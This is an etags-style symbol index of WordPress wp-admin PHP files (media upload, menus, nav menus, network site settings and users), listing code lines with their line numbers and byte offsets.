function _x() {}_x22,338
function add_filter() {}add_filter27,375
function esc_attr() {}esc_attr32,420
function apply_filters() {}apply_filters37,463
function get_option() {}get_option42,511
function is_lighttpd_before_150() {}is_lighttpd_before_15047,556
function add_action() {}add_action52,613
function do_action_ref_array() {}do_action_ref_array57,658
function get_bloginfo() {}get_bloginfo62,712
function is_admin() {return true;}is_admin67,759
function site_url() {}site_url72,814
function admin_url() {}admin_url77,857
function wp_guess_url() {}wp_guess_url82,901
function get_file($path) {get_file84,929
		$path = realpath($path);path87,993
$load = preg_replace( '/[^a-z0-9,_-]+/i', '', $_GET['load'] );load98,1211
$load = explode(',', $load);load99,1274
$compress = ( isset($_GET['c']) && $_GET['c'] );compress104,1332
$force_gzip = ( $compress && 'gzip' == $_GET['c'] );force_gzip105,1381
$rtl = ( isset($_GET['dir']) && 'rtl' == $_GET['dir'] );rtl106,1434
$expires_offset = 31536000;expires_offset107,1491
$out = '';out108,1519
$wp_styles = new WP_Styles();wp_styles110,1531
	$style = $wp_styles->registered[$handle];style117,1695
	$path = ABSPATH . $style->src;path118,1738
	$content = get_file($path) . "\n";content120,1771
		$rtl_path = is_bool($style->extra['rtl']) ? str_replace( '.css', '-rtl.css', $path ) : ABSPATH . $style->extra['rtl'];rtl_path123,1878
		$content = str_replace( '../images/', '../wp-includes/images/', $content );content128,2104
		$out = gzdeflate( $out, 3 );out143,2881
		$out = gzencode( $out, 3 );out146,3055

wordpress/wp-admin/maint/repair.php,763
define('WP_REPAIRING', true);WP_REPAIRING8,107
	$optimize = 2 == $_GET['repair'];optimize29,980
	$okay = true;okay30,1015
	$problems = array();problems31,1030
	$tables = $wpdb->tables();tables33,1053
	$tables = array_merge( $tables, (array) apply_filters( 'tables_to_repair', array() ) ); // Return tables with table prefixes.tables39,1273
		$check = $wpdb->get_row( "CHECK TABLE $table" );check43,1494
			$repair = $wpdb->get_row( "REPAIR TABLE $table" );repair53,1969
				$okay = false;okay63,2474
			$check = $wpdb->get_row( "ANALYZE TABLE $table" );check68,2533
				$check = $wpdb->get_row( "OPTIMIZE TABLE $table" );check75,2824
		$problem_output = '';problem_output92,3672
		foreach ( $problems as $table => $problem )table93,3696

wordpress/wp-admin/media-new.php,0

wordpress/wp-admin/media-upload.php,1068
	define( 'IFRAME_REQUEST' , true );IFRAME_REQUEST13,248
$ID = isset($ID) ? (int) $ID : 0;ID30,775
$post_id = isset($post_id)? (int) $post_id : 0;post_id31,809
if ( isset($action) && $action == 'edit' && !$ID )action34,895
	$errors = array();errors38,1018
		$id = media_handle_upload('async-upload', $_REQUEST['post_id']);id46,1311
			$id = false;id50,1458
		$errors = array_merge($errors, (array) media_upload_form_handler());errors55,1525
		$location = 'upload.php';location57,1597
	$title = __('Upload New Media');title68,1803
	$parent_file = 'upload.php';parent_file69,1837
	$form_class = 'media-upload-form type-form validate';form_class90,3310
		$type = strval($_GET['type']);type130,4567
		$type = apply_filters('media_upload_default_type', 'file');type132,4606
		$tab = strval($_GET['tab']);tab136,4741
		$tab = apply_filters('media_upload_default_tab', 'type');tab138,4778
	$body_id = 'media-upload';body_id140,4839
	if ( $tab == 'type' || $tab == 'type_url' || ! array_key_exists( $tab , media_upload_tabs() ) )tab143,4925

wordpress/wp-admin/media.php,984
$parent_file = 'upload.php';parent_file12,183
$submenu_file = 'upload.php';submenu_file13,212
	$attachment_id = (int) $_POST['attachment_id'];attachment_id19,320
	$errors = media_upload_form_handler();errors25,527
		$location = 'media.php';location28,593
		if ( $referer = wp_get_original_referer() ) {referer29,620
				$location = $referer;location31,769
			$location = remove_query_arg('message', $location);location34,852
			$location = add_query_arg('posted',	$attachment_id, $location);location35,907
			$location = add_query_arg('message', 'updated', $location);location37,1032
	$title = __('Edit Media');title45,1164
		$errors = null;errors48,1216
	$att_id = (int) $_GET['attachment_id'];att_id54,1332
	$att = get_post($att_id);att59,1488
	$parent_file = 'upload.php';parent_file89,3556
	$message = '';message90,3586
	$class = '';class91,3602
			$message = __('Media attachment updated.');message95,3701
			$class = 'updated';class96,3748

wordpress/wp-admin/menu-header.php,3935
$self = preg_replace('|^.*/wp-admin/network/|i', '', $_SERVER['PHP_SELF']);self16,189
$self = preg_replace('|^.*/wp-admin/|i', '', $self);self17,265
$self = preg_replace('|^.*/plugins/|i', '', $self);self18,318
$self = preg_replace('|^.*/mu-plugins/|i', '', $self);self19,370
$parent_file = apply_filters("parent_file", $parent_file); // For plugins to move submenu tabs around.parent_file22,524
function _wp_menu_output( $menu, $submenu, $submenu_as_parent = true ) {_wp_menu_output36,801
function _wp_menu_output( $menu, $submenu, $submenu_as_parent = true ) {submenu_as_parent36,801
	$first = true;first39,953
	foreach ( $menu as $key => $item ) {key41,1041
		$admin_is_parent = false;admin_is_parent42,1079
		$class = array();class43,1107
		$aria_attributes = 'tabindex="1"';aria_attributes44,1127
			$first = false;first48,1214
		$submenu_items = false;submenu_items51,1238
			$submenu_items = $submenu[$item[2]];submenu_items54,1337
		if ( ( $parent_file && $item[2] == $parent_file ) || ( empty($typenow) && $self == $item[2] ) ) {self57,1382
		$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';class68,1770
		$id = ! empty( $item[5] ) ? ' id="' . preg_replace( '|[^a-zA-Z0-9_:.]|', '-', $item[5] ) . '"' : '';id69,1835
		$img = '';img70,1938
			$img = ( 'div' === $item[6] ) ? '<br />' : '<img src="' . $item[6] . '" alt="" />';img72,1980
		$arrow = '<div class="wp-menu-arrow"><div></div></div>';arrow73,2067
		$title = wptexturize( $item[0] );title75,2127
		$aria_label = esc_attr( strip_tags( $item[0] ) ); // strip the comment/plugins/updates bubbles spans but keep the pending number if anyaria_label76,2163
			$submenu_items = array_values( $submenu_items );  // Re-index.submenu_items83,2496
			$menu_hook = get_plugin_page_hook( $submenu_items[0][2], $item[2] );menu_hook84,2562
			$menu_file = $submenu_items[0][2];menu_file85,2634
			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )pos86,2672
				$menu_file = substr( $menu_file, 0, $pos );menu_file87,2729
				$admin_is_parent = true;admin_is_parent89,2904
			$menu_hook = get_plugin_page_hook( $item[2], 'admin.php' );menu_hook95,3421
			$menu_file = $item[2];menu_file96,3484
			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )pos97,3510
				$menu_file = substr( $menu_file, 0, $pos );menu_file98,3567
				$admin_is_parent = true;admin_is_parent100,3730
			$first = true;first110,4314
			foreach ( $submenu_items as $sub_key => $sub_item ) {sub_key111,4332
				$aria_attributes = 'tabindex="1"';aria_attributes115,4451
				$class = array();class116,4490
					$first = false;first119,4565
				$menu_file = $item[2];menu_file122,4593
				if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )pos124,4621
					$menu_file = substr( $menu_file, 0, $pos );menu_file125,4679
				$self_type = ! empty( $typenow ) ? $self . '?post_type=' . $typenow : 'nothing';self_type128,4811
					if ( $submenu_file == $sub_item[2] )submenu_file131,4933
					( ! isset( $plugin_page ) && $self == $sub_item[2] ) ||self136,5204
					( isset( $plugin_page ) && $plugin_page == $sub_item[2] && ( $item[2] == $self_type || $item[2] == $self || file_exists($menu_file) === false ) )plugin_page137,5265
				$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';class142,5458
				$menu_hook = get_plugin_page_hook($sub_item[2], $item[2]);menu_hook144,5526
				$sub_file = $sub_item[2];sub_file145,5589
				if ( false !== ( $pos = strpos( $sub_file, '?' ) ) )pos146,5619
					$sub_file = substr($sub_file, 0, $pos);sub_file147,5676
				$title = wptexturize($sub_item[0]);title149,5722
						$sub_item_url = add_query_arg( array('page' => $sub_item[2]), $item[2] );sub_item_url154,6132
						$sub_item_url = add_query_arg( array('page' => $sub_item[2]), 'admin.php' );sub_item_url156,6222
					$sub_item_url = esc_url( $sub_item_url );sub_item_url158,6306

wordpress/wp-admin/menu.php,1602
	$update_data = wp_get_update_data();update_data34,766
	$i = 15;i47,1544
	$i = 15;i71,3082
$awaiting_mod = wp_count_comments();awaiting_mod80,3445
$awaiting_mod = $awaiting_mod->moderated;awaiting_mod81,3482
$_wp_last_object_menu = 25; // The index of the last top-level menu in the object menu group_wp_last_object_menu87,3928
	$ptype_obj = get_post_type_object( $ptype );ptype_obj90,4143
	$ptype_menu_position = is_int( $ptype_obj->menu_position ) ? $ptype_obj->menu_position : ++$_wp_last_object_menu; // If we're to use $_wp_last_object_menu, increment it first.ptype_menu_position94,4280
	$ptype_for_id = sanitize_html_class( $ptype );ptype_for_id95,4457
		$menu_icon   = esc_url( $ptype_obj->menu_icon );menu_icon97,4550
		$ptype_class = $ptype_for_id;ptype_class98,4601
		$menu_icon   = 'div';menu_icon100,4643
		$ptype_class = 'post';ptype_class101,4667
	$core_menu_positions = array(59, 60, 65, 70, 75, 80, 85, 99);core_menu_positions105,4819
	$i = 15;i113,5527
function _add_themes_utility_last() {_add_themes_utility_last140,7032
$menu_perms = get_site_option( 'menu_items', array() );menu_perms145,7310
		$update_data = wp_get_update_data();update_data148,7481
	$count = '';count150,7521
		$count = "<span class='update-plugins count-{$update_data['counts']['plugins']}'><span class='plugin-count'>" . number_format_i18n($update_data['counts']['plugins']) . "</span></span>";count152,7600
$_wp_last_utility_menu = 80; // The index of the last top-level menu in the utility menu group_wp_last_utility_menu207,11099
$compat = array(compat220,11688

wordpress/wp-admin/moderation.php,0

wordpress/wp-admin/ms-admin.php,0

wordpress/wp-admin/ms-delete-site.php,510
$title = __( 'Delete Site' );title28,830
$parent_file = 'tools.php';parent_file29,860
	$hash = wp_generate_password( 20, false );hash39,1195
	$url_delete = esc_url( admin_url( 'ms-delete-site.php?h=' . $hash ) );url_delete42,1285
	$content = apply_filters( 'delete_site_email_content', __( "Dear User,content44,1358
	$content = str_replace( '###URL_DELETE###', $url_delete, $content );content59,1911
	$content = str_replace( '###SITE_NAME###', $current_site->site_name, $content );content60,1981

wordpress/wp-admin/ms-edit.php,0

wordpress/wp-admin/ms-options.php,0

wordpress/wp-admin/ms-sites.php,0

wordpress/wp-admin/ms-themes.php,0

wordpress/wp-admin/ms-upgrade-network.php,0

wordpress/wp-admin/ms-users.php,0

wordpress/wp-admin/my-sites.php,906
$action = isset( $_POST['action'] ) ? $_POST['action'] : 'splash';action18,327
$blogs = get_blogs_of_user( $current_user->ID );blogs20,395
$updated = false;updated22,445
	$blog = get_blog_details( (int) $_POST['primary_blog'] );blog26,583
		$updated = true;updated29,779
$title = __( 'My Sites' );title35,878
$parent_file = 'index.php';parent_file36,905
	$settings_html = apply_filters( 'myblogs_options', '', 'global' );settings_html76,2381
	$num = count( $blogs );num83,2626
	$cols = 1;cols84,2651
		$cols = 4;cols86,2682
		$cols = 2;cols88,2718
	$num_rows = ceil( $num / $cols );num_rows89,2731
	$split = 0;split90,2766
	for ( $i = 1; $i <= $num_rows; $i++ ) {i91,2779
		$split = $split + $cols;split93,2870
	$c = '';c96,2901
		$c = $c == 'alternate' ? '' : 'alternate';c98,2940
		$i = 0;i100,3011
			$s = $i == 3 ? '' : 'border-right: 1px solid #ccc;';s102,3056

wordpress/wp-admin/nav-menus.php,7128
// Load all the nav menu interface functionsfunctions15,242
$messages = array();messages42,1046
$nav_menu_selected_title = '';nav_menu_selected_title45,1121
$nav_menu_selected_id = isset( $_REQUEST['menu'] ) ? (int) $_REQUEST['menu'] : 0;nav_menu_selected_id48,1201
$action = isset( $_REQUEST['action'] ) ? $_REQUEST['action'] : 'edit';action51,1324
		$menu_item_id = isset( $_REQUEST['menu-item'] ) ? (int) $_REQUEST['menu-item'] : 0;menu_item_id64,1931
			$menus = isset( $_REQUEST['menu'] ) ? array( (int) $_REQUEST['menu'] ) : wp_get_object_terms( $menu_item_id, 'nav_menu', array( 'fields' => 'ids' ) );menus66,2062
				$menu_id = (int) $menus[0];menu_id68,2276
				$ordered_menu_items = wp_get_nav_menu_items( $menu_id );ordered_menu_items69,2308
				$menu_item_data = (array) wp_setup_nav_menu_item( get_post( $menu_item_id ) );menu_item_data70,2369
				$dbids_to_orders = array();dbids_to_orders73,2528
				$orders_to_dbids = array();orders_to_dbids74,2560
					$next_item_id = $orders_to_dbids[$dbids_to_orders[$menu_item_id] + 1];next_item_id88,3105
					$next_item_data = (array) wp_setup_nav_menu_item( get_post( $next_item_id ) );next_item_data89,3181
						$parent_db_id = in_array( $menu_item_data['menu_item_parent'], $orders_to_dbids ) ? (int) $menu_item_data['menu_item_parent'] : 0;parent_db_id100,3570
						$parent_object = wp_setup_nav_menu_item( get_post( $parent_db_id ) );parent_object102,3708
							$parent_data = (array) $parent_object;parent_data105,3832
		$menu_item_id = isset( $_REQUEST['menu-item'] ) ? (int) $_REQUEST['menu-item'] : 0;menu_item_id137,5147
			$menus = isset( $_REQUEST['menu'] ) ? array( (int) $_REQUEST['menu'] ) : wp_get_object_terms( $menu_item_id, 'nav_menu', array( 'fields' => 'ids' ) );menus139,5278
				$menu_id = (int) $menus[0];menu_id141,5492
				$ordered_menu_items = wp_get_nav_menu_items( $menu_id );ordered_menu_items142,5524
				$menu_item_data = (array) wp_setup_nav_menu_item( get_post( $menu_item_id ) );menu_item_data143,5585
				$dbids_to_orders = array();dbids_to_orders146,5744
				$orders_to_dbids = array();orders_to_dbids147,5776
						$parent_db_id = in_array( $menu_item_data['menu_item_parent'], $orders_to_dbids ) ? (int) $menu_item_data['menu_item_parent'] : 0;parent_db_id167,6766
						$parent_object = wp_setup_nav_menu_item( get_post( $parent_db_id ) );parent_object168,6903
							$parent_data = (array) $parent_object;parent_data171,7027
								$_possible_parent_id = (int) get_post_meta( $orders_to_dbids[$dbids_to_orders[$parent_db_id] - 1], '_menu_item_menu_item_parent', true);_possible_parent_id186,7757
		$menu_item_id = (int) $_REQUEST['menu-item'];menu_item_id228,9587
			$deleted_nav_menu = wp_get_nav_menu_object( $nav_menu_selected_id );deleted_nav_menu239,10052
			$delete_nav_menu = wp_delete_nav_menu( $nav_menu_selected_id );delete_nav_menu240,10124
				$locations = get_theme_mod( 'nav_menu_locations' );locations246,10402
				foreach ( (array) $locations as $location => $menu_id ) {location247,10458
					if ( $menu_id == $nav_menu_selected_id )menu_id248,10520
				$nav_menu_selected_id = 0;nav_menu_selected_id254,10822
				$_nav_menus = wp_get_nav_menus( array('orderby' => 'name') );_nav_menus255,10853
				foreach( $_nav_menus as $index => $_nav_menu ) {index256,10919
					 || $index == count( $_nav_menus ) - 1 ) {index258,11039
						$nav_menu_selected_id = $_nav_menu->term_id;nav_menu_selected_id259,11087
			$nav_menu_selected_id = 0;nav_menu_selected_id267,11272
			$new_menu_title = trim( esc_html( $_POST['menu-name'] ) );new_menu_title281,11653
				$_nav_menu_selected_id = wp_update_nav_menu_object( 0, array('menu-name' => $new_menu_title) );_nav_menu_selected_id284,11744
					$_menu_object = wp_get_nav_menu_object( $_nav_menu_selected_id );_menu_object289,12028
					$nav_menu_selected_id = $_nav_menu_selected_id;nav_menu_selected_id290,12099
					$nav_menu_selected_title = $_menu_object->name;nav_menu_selected_title291,12152
			$_menu_object = wp_get_nav_menu_object( $nav_menu_selected_id );_menu_object301,12559
			$menu_title = trim( esc_html( $_POST['menu-name'] ) );menu_title303,12628
				$menu_title = $_menu_object->name;menu_title306,12824
				$_nav_menu_selected_id = wp_update_nav_menu_object( $nav_menu_selected_id, array( 'menu-name' => $menu_title ) );_nav_menu_selected_id310,12912
					$_menu_object = $_nav_menu_selected_id;_menu_object312,13081
					$_menu_object = wp_get_nav_menu_object( $_nav_menu_selected_id );_menu_object315,13258
					$nav_menu_selected_title = $_menu_object->name;nav_menu_selected_title316,13329
				$unsorted_menu_items = wp_get_nav_menu_items( $nav_menu_selected_id, array('orderby' => 'ID', 'output' => ARRAY_A, 'output_key' => 'ID', 'post_status' => 'draft,publish') );unsorted_menu_items323,13462
				$menu_items = array();menu_items324,13640
				$post_fields = array( 'menu-item-db-id', 'menu-item-object-id', 'menu-item-object', 'menu-item-parent-id', 'menu-item-position', 'menu-item-type', 'menu-item-title', 'menu-item-url', 'menu-item-description', 'menu-item-attr-title', 'menu-item-target', 'menu-item-classes', 'menu-item-xfn' );post_fields329,13789
					foreach( (array) $_POST['menu-item-db-id'] as $_key => $k ) {_key333,14224
						$args = array();args339,14405
						$menu_item_db_id = wp_update_nav_menu_item( $nav_menu_selected_id, ( $_POST['menu-item-db-id'][$_key] != $_key ? 0 : $_key ), $args );menu_item_db_id343,14554
				$auto_add = ! empty( $_POST['auto-add-pages'] );auto_add362,15275
				$nav_menu_option = (array) get_option( 'nav_menu_options' );nav_menu_option363,15328
					if ( false !== ( $key = array_search( $nav_menu_selected_id, $nav_menu_option['auto_add'] ) ) )key370,15665
$nav_menus = wp_get_nav_menus( array('orderby' => 'name') );nav_menus389,16410
$recently_edited = (int) get_user_option( 'nav_menu_recently_edited' );recently_edited392,16504
	$recently_edited = $nav_menu_selected_id;recently_edited396,16755
	$nav_menu_selected_id = $recently_edited;nav_menu_selected_id400,17048
	$nav_menu_selected_id = $nav_menus[0]->term_id;nav_menu_selected_id404,17244
	$_menu_object = wp_get_nav_menu_object( $nav_menu_selected_id );_menu_object413,17618
	$nav_menu_selected_title = ! is_wp_error( $_menu_object ) ? $_menu_object->name : '';nav_menu_selected_title414,17684
foreach( (array) $nav_menus as $key => $_nav_menu ) {key418,17807
// by adding a class for the max menu depth.for427,18162
$_wp_nav_menu_max_depth = 0;_wp_nav_menu_max_depth429,18239
	$edit_markup = wp_get_nav_menu_to_edit( $nav_menu_selected_id );edit_markup433,18382
function wp_nav_menu_max_depth($classes) {wp_nav_menu_max_depth435,18449
					if ( $nav_menu_selected_id == $_nav_menu->term_id ) : ?><span class="nav-tab nav-tab-active">nav_menu_selected_id512,22860
										$auto_add = get_option( 'nav_menu_options' );auto_add552,24664
											$auto_add = false;auto_add554,24770
											$auto_add = true;auto_add556,24892
											$auto_add = false;auto_add558,24936

wordpress/wp-admin/network/about.php,0

wordpress/wp-admin/network/admin.php,394
define( 'WP_NETWORK_ADMIN', true );WP_NETWORK_ADMIN10,127
$redirect_network_admin_request = ( ( $current_blog->domain != $current_site->domain ) || ( $current_blog->path != $current_site->path ) );redirect_network_admin_request18,354
$redirect_network_admin_request = apply_filters( 'redirect_network_admin_request', $redirect_network_admin_request );redirect_network_admin_request19,494

wordpress/wp-admin/network/credits.php,0

wordpress/wp-admin/network/edit.php,0

wordpress/wp-admin/network/freedoms.php,0

wordpress/wp-admin/network/index.php,88
$title = __( 'Dashboard' );title22,486
$parent_file = 'index.php';parent_file23,514

wordpress/wp-admin/network/menu.php,57
$update_data = wp_get_update_data();update_data24,1001

wordpress/wp-admin/network/plugin-editor.php,0

wordpress/wp-admin/network/plugin-install.php,57
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST11,202

wordpress/wp-admin/network/plugins.php,0

wordpress/wp-admin/network/profile.php,0

wordpress/wp-admin/network/settings.php,2255
$title = __( 'Network Settings' );title19,414
$parent_file = 'settings.php';parent_file20,449
	$illegal_names = explode( ' ', $_POST['illegal_names'] );illegal_names53,3253
		$name = trim( $name );name55,3359
		$limited_email_domains = str_replace( ' ', "\n", $_POST['limited_email_domains'] );limited_email_domains62,3534
		$limited_email_domains = explode( "\n", stripslashes( $limited_email_domains ) );limited_email_domains63,3620
		$limited_email = array();limited_email64,3704
			$domain = trim( $domain );domain66,3790
		$banned_email_domains = explode( "\n", stripslashes( $_POST['banned_email_domains'] ) );banned_email_domains76,4142
		$banned = array();banned77,4233
			$domain = trim( $domain );domain79,4311
	$options = array( 'registrationnotification', 'registration', 'add_new_users', 'menu_items', 'upload_space_check_disabled', 'blog_upload_space', 'upload_filetypes', 'site_name', 'first_post', 'first_page', 'first_comment', 'first_comment_url', 'first_comment_author', 'welcome_email', 'welcome_user_email', 'fileupload_maxk', 'global_terms_enabled' );options88,4600
	$checked_options = array( 'menu_items' => array(), 'registrationnotification' => 'no', 'upload_space_check_disabled' => 1, 'add_new_users' => 0 );checked_options89,4953
	foreach ( $checked_options as $option_name => $option_unchecked_value ) {option_name90,5101
		$value = stripslashes_deep( $_POST[$option_name] );value97,5363
				$reg = get_site_option( 'registration' );reg147,7187
					<?php $limited_email_domains = get_site_option( 'limited_email_domains' );limited_email_domains190,9777
					$limited_email_domains = str_replace( ' ', "\n", $limited_email_domains ); ?>limited_email_domains191,9857
<?php echo esc_textarea( $limited_email_domains == '' ? '' : implode( "\n", (array) $limited_email_domains ) ); ?></textarea>limited_email_domains193,10031
		$languages = get_available_languages();languages296,15003
			$lang = get_site_option( 'WPLANG' );lang298,15078
			$menu_perms = get_site_option( 'menu_items' );menu_perms321,15696
			$menu_items = apply_filters( 'mu_menu_items', array( 'plugins' => __( 'Plugins' ) ) );menu_items322,15746
			foreach ( (array) $menu_items as $key => $val ) {key323,15836

wordpress/wp-admin/network/setup.php,0

wordpress/wp-admin/network/site-info.php,1454
$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;id36,2378
$details = get_blog_details( $id );details41,2492
$is_main_site = is_main_site( $id );is_main_site45,2643
		$blog_address = get_blogaddress_by_domain( $_POST['blog']['domain'], $_POST['blog']['path'] );blog_address53,2906
	$blog_data = stripslashes_deep( $_POST['blog'] );blog_data65,3310
	$existing_details = get_blog_details( $id, false );existing_details66,3361
	$blog_data_checkboxes = array( 'public', 'archived', 'spam', 'mature', 'deleted' );blog_data_checkboxes67,3414
	$messages = array();messages82,3921
$site_url_no_http = preg_replace( '#^http(s)?://#', '', get_blogaddress_by_id( $id ) );site_url_no_http87,4025
$title_site_url_linked = sprintf( __('Edit Site: <a href="%1$s">%2$s</a>'), get_blogaddress_by_id( $id ), $site_url_no_http );title_site_url_linked88,4113
$title = sprintf( __('Edit Site: %s'), $site_url_no_http );title89,4240
$parent_file = 'sites.php';parent_file91,4301
$submenu_file = 'sites.php';submenu_file92,4329
$tabs = array(tabs103,4545
foreach ( $tabs as $tab_id => $tab ) {tab_id109,4915
	$class = ( $tab['url'] == $pagenow ) ? ' nav-tab-active' : '';class110,4954
			$protocol = is_ssl() ? 'https://' : 'http://';protocol127,5594
		$attribute_fields = array( 'public' => __( 'Public' ) );attribute_fields152,7201
			<?php foreach ( $attribute_fields as $field_key => $field_label ) : ?>field_key163,7574

wordpress/wp-admin/network/site-new.php,1294
	$blog = $_POST['blog'];blog41,1506
	$domain = '';domain42,1531
		$domain = strtolower( $blog['domain'] );domain44,1607
		$subdirectory_reserved_names = apply_filters( 'subdirectory_reserved_names', array( 'page', 'comments', 'blog', 'files', 'feed' ) );subdirectory_reserved_names48,1761
	$email = sanitize_email( $blog['email'] );email53,2165
	$title = $blog['title'];title54,2209
		$newdomain = $domain . '.' . preg_replace( '|^www\.|', '', $current_site->domain );newdomain64,2489
		$path = $base;path65,2575
		$newdomain = $current_site->domain;newdomain67,2602
		$path = $base . $domain . '/';path68,2640
	$password = 'N/A';password71,2677
	$user_id = email_exists($email);user_id72,2697
		$password = wp_generate_password( 12, false );password74,2795
		$user_id = wpmu_create_user( $domain, $password, $email );user_id75,2844
	$id = wpmu_create_blog( $newdomain, $path, $title, $user_id , array( 'public' => 1 ), $current_site->id );id83,3078
		$content_mail = sprintf( __( "New site created by %1s\n\nAddress: %2s\nName: %3s"), $current_user->user_login , get_site_url( $id ), stripslashes( $title ) );content_mail88,3386
	$messages = array();messages99,4016
$title = __('Add New Site');title104,4308
$parent_file = 'sites.php';parent_file105,4337

wordpress/wp-admin/network/site-settings.php,1713
$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;id36,2373
$details = get_blog_details( $id );details41,2487
$is_main_site = is_main_site( $id );is_main_site45,2638
	$c = 1;c52,2847
	$count = count( $_POST['option'] );count53,2856
	$skip_options = array( 'allowedthemes' ); // Don't update these options since they are handled elsewhere in the form.skip_options54,2893
	foreach ( (array) $_POST['option'] as $key => $val ) {key55,3012
		if ( $key === 0 || is_array( $val ) || in_array($key, $skip_options) )key56,3068
		if ( $c == $count )c58,3246
	$messages = array();messages72,3636
$site_url_no_http = preg_replace( '#^http(s)?://#', '', get_blogaddress_by_id( $id ) );site_url_no_http77,3743
$title_site_url_linked = sprintf( __('Edit Site: <a href="%1$s">%2$s</a>'), get_blogaddress_by_id( $id ), $site_url_no_http );title_site_url_linked78,3831
$title = sprintf( __('Edit Site: %s'), $site_url_no_http );title79,3958
$parent_file = 'sites.php';parent_file81,4019
$submenu_file = 'sites.php';submenu_file82,4047
$tabs = array(tabs93,4263
foreach ( $tabs as $tab_id => $tab ) {tab_id99,4633
	$class = ( $tab['url'] == $pagenow ) ? ' nav-tab-active' : '';class100,4672
		$blog_prefix = $wpdb->get_blog_prefix( $id );blog_prefix115,5227
		$options = $wpdb->get_results( "SELECT * FROM {$blog_prefix}options WHERE option_name NOT LIKE '\_%' AND option_name NOT LIKE '%user_roles'" );options116,5275
				$editblog_default_role = $option->option_value;editblog_default_role119,5506
			$disabled = false;disabled120,5558
			$class = 'all-options';class121,5580
					$disabled = true;disabled127,5873
					$class = 'all-options disabled';class128,5896

wordpress/wp-admin/network/site-themes.php,2126
$menu_perms = get_site_option( 'menu_items', array() );menu_perms16,281
$wp_list_table = _get_list_table('WP_MS_Themes_List_Table');wp_list_table41,2541
$action = $wp_list_table->current_action();action43,2603
$s = isset($_REQUEST['s']) ? $_REQUEST['s'] : '';s45,2648
$temp_args = array( 'enabled', 'disabled', 'error' );temp_args48,2796
$referer = remove_query_arg( $temp_args, wp_get_referer() );referer50,2933
$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;id52,2995
$details = get_blog_details( $id );details59,3143
$is_main_site = is_main_site( $id );is_main_site63,3294
	$allowed_themes = get_option( 'allowedthemes' );allowed_themes67,3373
			$theme = $_GET['theme'];theme72,3523
			$action = 'enabled';action73,3551
			$n = 1;n74,3575
				$allowed_themes = array( $theme => true );allowed_themes76,3613
			$theme = $_GET['theme'];theme82,3793
			$action = 'disabled';action83,3821
			$n = 1;n84,3846
				$allowed_themes = array();allowed_themes86,3884
				$themes = (array) $_POST['checked'];themes93,4077
				$action = 'enabled';action94,4118
				$n = count( $themes );n95,4143
				$action = 'error';action99,4262
				$n = 'none';n100,4285
				$themes = (array) $_POST['checked'];themes106,4424
				$action = 'disabled';action107,4465
				$n = count( $themes );n108,4491
				$action = 'error';action112,4612
				$n = 'none';n113,4635
	wp_safe_redirect( add_query_arg( array( 'id' => $id, $action => $n ), $referer ) );action121,4749
$site_url_no_http = preg_replace( '#^http(s)?://#', '', get_blogaddress_by_id( $id ) );site_url_no_http133,5079
$title_site_url_linked = sprintf( __('Edit Site: <a href="%1$s">%2$s</a>'), get_blogaddress_by_id( $id ), $site_url_no_http );title_site_url_linked134,5167
$title = sprintf( __('Edit Site: %s'), $site_url_no_http );title135,5294
$parent_file = 'sites.php';parent_file137,5355
$submenu_file = 'sites.php';submenu_file138,5383
$tabs = array(tabs147,5598
foreach ( $tabs as $tab_id => $tab ) {tab_id153,5968
	$class = ( $tab['url'] == $pagenow ) ? ' nav-tab-active' : '';class154,6007

wordpress/wp-admin/network/site-users.php,3205
$wp_list_table = _get_list_table('WP_Users_List_Table');wp_list_table19,397
$referer = remove_query_arg( 'update', wp_get_referer() );referer40,2536
$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;id42,2596
$details = get_blog_details( $id );details47,2710
$is_main_site = is_main_site( $id );is_main_site51,2861
$blog_prefix = $wpdb->get_blog_prefix( $id );blog_prefix54,2918
	$editblog_roles = get_blog_option( $id, "{$blog_prefix}user_roles" );editblog_roles58,3109
	$editblog_roles = $wp_roles->roles;editblog_roles61,3233
$default_role = get_blog_option( $id, 'default_role' );default_role63,3272
$action = $wp_list_table->current_action();action65,3329
			$user = $_POST['user'];user73,3519
				$update = 'err_new';update75,3643
				$password = wp_generate_password( 12, false);password77,3680
				$user_id = wpmu_create_user( esc_html( strtolower( $user['username'] ) ), $password, esc_html( $user['email'] ) );user_id78,3730
		 			$update = 'err_new_dup';update81,3881
					$update = 'newuser';update85,4039
				$update = 'adduser';update93,4204
				$newuser = $_POST['newuser'];newuser94,4229
				$userid = $wpdb->get_var( $wpdb->prepare( "SELECT ID FROM " . $wpdb->users . " WHERE user_login = %s", $newuser ) );userid95,4263
					$user = $wpdb->get_var( "SELECT user_id FROM " . $wpdb->usermeta . " WHERE user_id='$userid' AND meta_key='{$blog_prefix}capabilities'" );user97,4405
					if ( $user == false )user98,4549
						$update = 'err_add_member';update101,4646
					$update = 'err_add_notfound';update103,4693
				$update = 'err_add_notfound';update106,4746
			$update = 'remove';update115,4945
				$userids = $_REQUEST['users'];userids117,5008
					$user_id = (int) $user_id;user_id120,5083
				$update = 'err_remove';update126,5263
			$editable_roles = get_editable_roles();editable_roles132,5365
				$userids = $_REQUEST['users'];userids137,5564
				$update = 'promote';update138,5599
					$user_id = (int) $user_id;user_id140,5663
					$user = new WP_User( $user_id );user146,5847
				$update = 'err_promote';update150,5950
$site_url_no_http = preg_replace( '#^http(s)?://#', '', get_blogaddress_by_id( $id ) );site_url_no_http167,6319
$title_site_url_linked = sprintf( __('Edit Site: <a href="%1$s">%2$s</a>'), get_blogaddress_by_id( $id ), $site_url_no_http );title_site_url_linked168,6407
$title = sprintf( __('Edit Site: %s'), $site_url_no_http );title169,6534
$parent_file = 'sites.php';parent_file171,6595
$submenu_file = 'sites.php';submenu_file172,6623
$tabs = array(tabs191,7099
foreach ( $tabs as $tab_id => $tab ) {tab_id197,7469
	$class = ( $tab['url'] == $pagenow ) ? ' nav-tab-active' : '';class198,7508
			foreach ( $editblog_roles as $role => $role_assoc ){role277,10692
				$name = translate_user_role( $role_assoc['name'] );name278,10748
				$selected = ( $role == $default_role ) ? 'selected="selected"' : '';selected279,10804
